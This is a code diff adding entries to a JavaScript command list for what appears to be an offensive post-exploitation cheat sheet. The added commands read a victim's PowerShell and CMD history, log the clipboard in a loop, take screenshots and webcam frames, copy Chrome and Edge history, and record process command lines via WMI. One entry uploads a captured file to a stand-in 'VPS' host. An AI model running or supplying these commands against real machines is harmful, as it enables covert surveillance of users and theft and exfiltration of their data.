@@ -1787,6 +1787,138 @@ const COMMANDS = [
     tags: ["cmd", "defender"],
     accent: "#ff2a6d"
   },
+  {
+    title: "Read PS History (Target User)",
+    code: "type C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt",
+    tags: ["cmd", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Read All Users PS History",
+    code: "Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\*.txt | ForEach-Object { Write-Host \"=== $_ ===\"; Get-Content $_ }",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Enable PS Transcription",
+    code: "New-Item 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Force; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Name EnableTranscripting -Value 1; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Name OutputDirectory -Value 'C:\\\\Windows\\\\Temp\\\\ps_logs'",
+    tags: ["ps", "postexploit", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Read PS Transcription Logs",
+    code: "Get-ChildItem C:\\\\Windows\\\\Temp\\\\ps_logs\\\\*.txt | Get-Content",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Enable Script Block Logging",
+    code: "New-Item 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging' -Force; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1",
+    tags: ["ps", "postexploit", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Read Script Block Logs",
+    code: "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 100 | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Monitor Process Creation",
+    code: "Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine | Format-Table -Wrap",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Watch PS History Live",
+    code: "while($true){ Get-Content C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt -Tail 10; Start-Sleep 10 }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "CMD History",
+    code: "doskey /history",
+    tags: ["cmd", "postexploit", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Enable Cmd Line Auditing",
+    code: "reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f",
+    tags: ["cmd", "postexploit", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Read Security Log (Process)",
+    code: "Get-WinEvent -LogName Security -MaxEvents 500 | Where-Object {$_.Id -eq 4688} | Select-Object TimeCreated, @{n='Cmd';e={$_.Properties[8].Value}}",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Clipboard Capture Loop",
+    code: "while($true){ Get-Clipboard | Out-File C:\\\\Windows\\\\Temp\\\\clip.log -Append; Start-Sleep 5 }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Read Clipboard Log",
+    code: "Get-Content C:\\\\Windows\\\\Temp\\\\clip.log",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Screenshot Capture",
+    code: "Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $b.Save('C:\\\\Windows\\\\Temp\\\\ss.png')",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "List Open Windows",
+    code: "Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object ProcessName, MainWindowTitle",
+    tags: ["ps", "recon", "postexploit"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Webcam Capture (ffmpeg)",
+    code: "ffmpeg -f dshow -i video='Integrated Camera' -frames:v 1 C:\\\\Windows\\\\Temp\\\\cam.jpg",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "List Audio/Video Devices",
+    code: "Get-PnpDevice -Class Camera,AudioEndpoint | Select-Object FriendlyName, Status",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Browser History Chrome",
+    code: "copy $env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\'User Data'\\\\Default\\\\History C:\\\\Windows\\\\Temp\\\\chrome_hist.db",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Browser History Edge",
+    code: "copy $env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\'User Data'\\\\Default\\\\History C:\\\\Windows\\\\Temp\\\\edge_hist.db",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Exfil File to VPS",
+    code: "$b=[IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\ss.png'); IWR -Uri 'http://VPS:8080/upload' -Method POST -Body $b",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Record Typed Commands (WMI)",
+    code: "Register-WmiEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'\" -Action { $Event.SourceEventArgs.NewEvent.TargetInstance.CommandLine | Out-File C:\\\\Windows\\\\Temp\\\\cmds.log -Append }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Read Command Log",
+    code: "Get-Content C:\\\\Windows\\\\Temp\\\\cmds.log -Tail 50",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
 ];
 
 const list = document.getElementById('cmdList');
